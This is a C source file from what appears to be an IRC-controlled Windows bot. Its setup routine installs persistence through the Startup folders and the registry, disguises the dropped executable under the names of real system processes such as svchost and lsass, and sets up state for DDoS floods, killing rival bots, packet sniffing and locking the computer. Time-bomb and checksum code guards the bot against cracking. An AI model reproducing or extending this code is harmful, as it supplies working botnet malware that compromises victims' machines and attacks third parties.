#include "../Includes/includes.h"

void DefineInitialVariables() //Defines necessary variables
{
    srand(GenerateRandomSeed());
    AdjustPrivileges(TRUE);

    bUninstallProgram = FALSE;
    nBootType = GetSystemMetrics(SM_CLEANBOOT);

    strcpy(cReturnNewline, "\r\n");
    strcpy(cWindowsDirectory, getenv("WINDIR"));
    strcpy(cAppData, getenv("APPDATA"));
    strcpy(cTempDirectory, getenv("TEMP"));
    strcpy(cUserProfile, getenv("USERPROFILE"));
    strcpy(cAllUsersProfile, getenv("ALLUSERSPROFILE"));
    strcpy(cProgramFiles, getenv("PROGRAMFILES"));
    SetOperatingSystem();
    strcpy(cBuild, "\\Start Menu\\Programs\\Startup");
    strcpy(cHostsPath, "\\System32\\drivers\\etc\\hosts");
    strcpy(cRegistryKeyToCurrentVersion, "Software\\Microsoft\\Windows\\CurrentVersion\\");

    if(dwOperatingSystem == WINDOWS_2003 || dwOperatingSystem == WINDOWS_XP || dwOperatingSystem == WINDOWS_2000)
        bComputerXpOrUnder = TRUE;
    else
        bComputerXpOrUnder = FALSE;

    bBotkillOnce = FALSE;
    bBotkillInitiatedViaCommand = FALSE;

    if(bComputerXpOrUnder)
    {
        strcpy(cAllUsersStartupDirectory, cAllUsersProfile);
        strcat(cAllUsersStartupDirectory, cBuild);

        strcpy(cUserStartupDirectory, cUserProfile);
        strcat(cUserStartupDirectory, cBuild);
    }
    else
    {
        char cMicrosoftSlashWindows[21];
        strcpy(cMicrosoftSlashWindows, "\\Microsoft\\Windows");

        strcpy(cAllUsersStartupDirectory, getenv("PROGRAMDATA"));
        strcat(cAllUsersStartupDirectory, cMicrosoftSlashWindows);
        strcat(cAllUsersStartupDirectory, cBuild);

        strcpy(cUserStartupDirectory, cAppData);
        strcat(cUserStartupDirectory, cMicrosoftSlashWindows);
        strcat(cUserStartupDirectory, cBuild);
    }

    sprintf(cBuild, "%s%s%s%s%i%s%s",
            cAppData,
            getenv(cIrcCommandUser),
            cOwner,
            cServer,
            usPort,
            cChannel,
            cVersion);
    ulFileHash = GetHash((unsigned char*)cBuild);
    itoa(ulFileHash, cFileHash, 10);

    strcpy(cZoneIdentifierSuffix, ":Zone.Identifier");

    GetModuleFileName(NULL, cThisFile, sizeof(cThisFile));
    ulTotalFiles = 0;
    bAutoRejoinChannel = FALSE;
    bRecoveredProcess = FALSE;
    bDdosBusy = FALSE;
    bRemoteIrcBusy = FALSE;
    uiWebsitesInQueue = 0;
    bDownloadAbort = FALSE;
    bBrowserDdosBusy = FALSE;
    bBusyFileSearching = FALSE;
    bExecutionArguments = FALSE;
    bGlobalOnlyOutputMd5Hash = FALSE;
    bMd5MustMatch = FALSE;
    memset(szMd5Match, 0, sizeof(szMd5Match));
    bWarFlood = FALSE;
    bLockComputer = FALSE;
    nUninstallTaskId = 0;

    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
    nExpirationDateMedian = EXPIRATION_MEDIAN + GetRandNum(EXPIRATION_CUSHION) - GetRandNum(EXPIRATION_CUSHION);
    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

    dwKilledProcesses = 0;
    dwFileChanges = 0;
    dwRegistryKeyChanges = 0;
    bBotkill = FALSE;

//    nPortOffset = 32767;

#ifndef SILENT_BY_DEFAULT
    bSilent = FALSE;
#else
    bSilent = TRUE;
#endif

    bPacketSniffing = FALSE;

    dwOpenSockets = 0;
    dwValidatedConnectionsToIrc = 0;

    strcpy(cBase64Characters, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");
    strcpy(cIrcResponseOk, "10OK:");
    strcpy(cIrcResponseErr, "4ERR:");

    sprintf(cMainProcessMutex, "MAIN_%li", ulFileHash);
    sprintf(cBackupProcessMutex, "BACKUP_%li", ulFileHash);
    sprintf(cUninstallProcessMutex, "UNINSTALL_%li", ulFileHash);
    strcpy(cUpdateMutex, "UPDATE__");

    DefineBrowsers();

    if(IsAdmin())
        strcpy(cRegistryKeyAccess, "HKLM");
    else
        strcpy(cRegistryKeyAccess, "HKCU");

    if(bComputerXpOrUnder)
    {
        if(IsAdmin())
            strcpy(cFileSaved, cWindowsDirectory);
        else
            strcpy(cFileSaved, cAppData);
    }
    else
        strcpy(cFileSaved, cAppData);

    strcat(cFileSaved, "\\");

    strcat(cFileSaved, cFileHash);
    strcpy(cFileSavedDirectory, cFileSaved);

    strcat(cFileSaved, "\\");
    strcat(cFileSaved, GenerateFilename(0));

    bNewInstallation = CheckIfExecutableIsNew();

    nCheckInInterval = 60;

    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
    time_t tTime;
    struct tm *ptmTime;
    tTime = time(NULL);
    ptmTime = localtime(&tTime);
    char cTodaysDate[20];
    memset(cTodaysDate, 0, sizeof(cTodaysDate));
    strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
    if(atoi(cTodaysDate) >= nExpirationDateMedian)
        strcpy(cFileSaved, "|");
    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s@%s", cServer, cChannel);
    char *cStr = cCheckString;
    unsigned long ulCheck = (47048/8)-500;
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum6)
        return;
    // <!-------! CRC AREA STOP !-------!>

#ifndef HTTP_BUILD
#ifdef INCLUDE_IRCWAR
    SetWarStatusIdle();
#endif
#endif
}

void ResolveMicrosoftUpdateDomain()
{
    HOSTENT *paddr;

    int nRand = GetRandNum(5);
    char szHost[DEFAULT];
    memset(szHost, 0, sizeof(szHost));

    if(nRand == 0)
        strcpy(szHost, "update.microsoft.com");
    else if(nRand == 1)
        strcpy(szHost, "www.update.microsoft.com");
    else if(nRand == 2)
        strcpy(szHost, "windowsupdate.microsoft.com");
    else if(nRand == 3)
        strcpy(szHost, "www.microsoft.com");
    else if(nRand == 4)
        strcpy(szHost, "microsoft.com");

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s & %s", cVersion, cOwner);
    char *cStr = cCheckString;
    unsigned long ulCheck = (1075*5)+6;
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum8)
    {
        strcpy(cAuthHost, cNickname);
        strcpy(cChannel, ".");
    }
    // <!-------! CRC AREA STOP !-------!>

    paddr = gethostbyname(szHost);

    return;
}

bool DnsFlushResolverCache()
{
    bool (WINAPI *DoDnsFlushResolverCache)();
    *(FARPROC*)&DoDnsFlushResolverCache = GetProcAddress(LoadLibrary("dnsapi.dll"), "DnsFlushResolverCache");

    if(!DoDnsFlushResolverCache)
        return FALSE;

    return DoDnsFlushResolverCache();
}

unsigned long GetHash(unsigned char *str) //Returns a hash calculated from a given string
{
    unsigned long hash = 5381;
    int c;

    while((c = *str++))
        hash = ((hash << 5) + hash) + c;

    // <!-------! CRC AREA START !-------!>
    int nLen;
    char cCheckString2[DEFAULT];
    sprintf(cCheckString2, "%s:%i", cServer, usPort);
    char *cStr2 = cCheckString2;
    unsigned long ulCheck2 = 794837-789456;
    while((nLen = *cStr2++))
        ulCheck2 = ((ulCheck2 << 5) + ulCheck2) + nLen;
    if(ulCheck2 != ulChecksum3)
        return GetRandNum(10000);
    // <!-------! CRC AREA STOP !-------!>

    return hash;
}

char cFilenameReturn[25];
char *GenerateFilename(short sOffset)
{
    memset(cFilenameReturn, 0, sizeof(cFilenameReturn));

    char cProcListArr[23][22] =
    {
        "svchost",
        "csrss",
        "rundll32",
        "winlogon",
        "smss",
        "taskhost",
        "unsecapp",
        "AdobeARM",
        "winsys",
        "jusched",
        "BCU",
        "wscntfy",
        "conhost",
        "csrss",
        "dwm",
        "sidebar",
        "ADService",
        "AppServices",
        "acrotray",
        "ctfmon",
        "lsass",
        "realsched",
        "spoolsv"
    };

    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
    time_t tTime;
    struct tm *ptmTime;
    tTime = time(NULL);
    ptmTime = localtime(&tTime);
    char cTodaysDate[20];
    memset(cTodaysDate, 0, sizeof(cTodaysDate));
    strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
    if(atoi(cTodaysDate) >= nExpirationDateMedian)
        return (char*)cFilenameReturn;
    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

    DWORD dwProcessNumber; //Maximum of 23
    if(ulFileHash < 0)
        dwProcessNumber = ulFileHash * -1;
    else
        dwProcessNumber = ulFileHash;

    dwProcessNumber %= 23;
    dwProcessNumber += sOffset;

    if(dwProcessNumber < 0)
        dwProcessNumber *= -1;

    if(dwProcessNumber > 22)
        dwProcessNumber -= sOffset + 1;

    memcpy(cFilenameReturn, cProcListArr[dwProcessNumber], sizeof(cProcListArr[dwProcessNumber]));

    strcat(cFilenameReturn, ".exe");

    return (char*)cFilenameReturn;
}

char cRandomBase64Data[MAX_DDOS_BUFFER];
char *GenerateRandomBase64Data(unsigned short usLength)
{
    memset(cRandomBase64Data, 0, sizeof(cRandomBase64Data));

    Sleep(1);
    srand(GenerateRandomSeed());

    for(unsigned short us = 0; us < usLength; us++)
        cRandomBase64Data[us] = cBase64Characters[GetRandNum(strlen(cBase64Characters))];

    return (char*)cRandomBase64Data;
}

unsigned long GetRandNum(unsigned long range) //Returns a random number within a given range
{
    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s@%s:%i", cChannel, cServer, usPort);
    char *cStr = cCheckString;
    unsigned long ulCheck = (360527*3)/(199+2);
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum7)
        return rand() % 10;
    // <!-------! CRC AREA STOP !-------!>

    Sleep(1);
    srand(GenerateRandomSeed());

    return rand() % range;
}

char *GenRandLCText() //Generates random lowercase text
{
    //char cLCAlphabet[27];
    //strcpy(cLCAlphabet, "abcdefghijklmnopqrstuvwxyz");

    static char cRandomText[9];

    for(unsigned short us = 0; us < 8; us++)
        cRandomText[us] = (char)(GetRandNum(26) + 65 + 32);

    //for(unsigned short us = 0; us < 8; us++)
    //cRandomText[us] = cLCAlphabet[GetRandNum(strlen(cLCAlphabet))];

    return (char*)cRandomText;
}

char cRandomIp[17];
char *GenerateRandomIp()
{
    Sleep(1);
    srand(GenerateRandomSeed());

    srand(GenerateRandomSeed());
    unsigned short usMaxIp = 255;

    memset(cRandomIp, 0, sizeof(cRandomIp));

    sprintf(cRandomIp, "%i.%i.%i.%i", GetRandNum(usMaxIp) + 1, GetRandNum(usMaxIp) + 1, GetRandNum(usMaxIp) + 1, GetRandNum(usMaxIp) + 1);

    return (char*)cRandomIp;
}

char cRandomPort[6];
char *GenerateRandomPort()
{
    itoa(GetRandNum(65545) + 1, cRandomPort, 10);
    return (char*)cRandomPort;
}

char cRandomFriendlyFilename[15];
char *GenerateRandomFriendlyFilename()
{
    memset(cRandomFriendlyFilename, 0, sizeof(cRandomFriendlyFilename));

    strcpy(cRandomFriendlyFilename, GenRandLCText());
    strcat(cRandomFriendlyFilename, ".");

    unsigned short usRandNum = GetRandNum(100);
    if(usRandNum < 10)
        strcat(cRandomFriendlyFilename, "txt");
    else if(usRandNum < 20)
        strcat(cRandomFriendlyFilename, "mp3");
    else if(usRandNum < 30)
        strcat(cRandomFriendlyFilename, "png");
    else if(usRandNum < 40)
        strcat(cRandomFriendlyFilename, "avi");
    else if(usRandNum < 50)
        strcat(cRandomFriendlyFilename, "gif");
    else if(usRandNum < 60)
        strcat(cRandomFriendlyFilename, "jpg");
    else if(usRandNum < 70)
        strcat(cRandomFriendlyFilename, "rar");
    else if(usRandNum < 80)
        strcat(cRandomFriendlyFilename, "zip");
    else if(usRandNum < 90)
        strcat(cRandomFriendlyFilename, "htm");
    else
        strcat(cRandomFriendlyFilename, "tif");

    return (char*)cRandomFriendlyFilename;
}

void RunThroughUuidProcedure()
{
    memset(cUuid, 0, sizeof(cUuid));
    UUID uuid;
    ZeroMemory(&uuid, sizeof(UUID));
    fncUuidCreate(&uuid);

    unsigned char *ucUuidString = NULL;
    fncUuidToString(&uuid, &ucUuidString);

    strcpy(cUuid, (const char*)ucUuidString);
    fncRpcStringFree(&ucUuidString);
    StripDashes(cUuid);

    char cKeyPath[MAX_PATH];
    strcpy(cKeyPath, "Software\\");
    //strcat(cKeyPath, cFileHash);

    if(bNewInstallation)
    {
#ifndef DEBUG
        /*FILE * pFile;
        pFile = fopen(cFile, "w");

        if(pFile != NULL)
        {
            fputs(cUuid, pFile);
            fclose(pFile);
        }*/

        CreateRegistryKey(HKEY_CURRENT_USER, cKeyPath, cFileHash, cUuid);

        /*if(CreateRegistryKey(HKEY_CURRENT_USER, cKeyPath, cFileHash, cUuid))
            printf("Successfully created UUID registry key value (UUID=\"%s\")[KeyPath=\"%s\", KeyName=\"%s\"]\n", cUuid, cKeyPath, cFileHash);
        else
            printf("Failed to create UUID registry key value\n");

        system("pause");*/
#endif
    }
    else
    {
        // char *cFileContents = GetContentsFromFile();
        //if(!strstr(cFileContents, "-"))
        //    strcpy(cUuid, cFileContents);

        char *cKeyValue = ReadRegistryKey(HKEY_CURRENT_USER, cKeyPath, cFileHash);

        if(!strstr(cKeyValue, "EFNF") || !strstr(cKeyValue, "NOERRSUC") || !strstr(cKeyValue, "ERROPFA") || strlen(cKeyValue) < 36)
        {
            if(strstr(cKeyValue, "\""))
                cKeyValue = FindInString(cKeyValue, (char*)"\"", (char*)"\"");

            strcpy(cUuid, cKeyValue);

            //printf("Successfully retrieved UUID registry key value (UUID=\"%s\")\n", cUuid);
        }
        //else
        //    printf("Failed to retrieve UUID registry key value\n");

        //system("pause");
    }
}
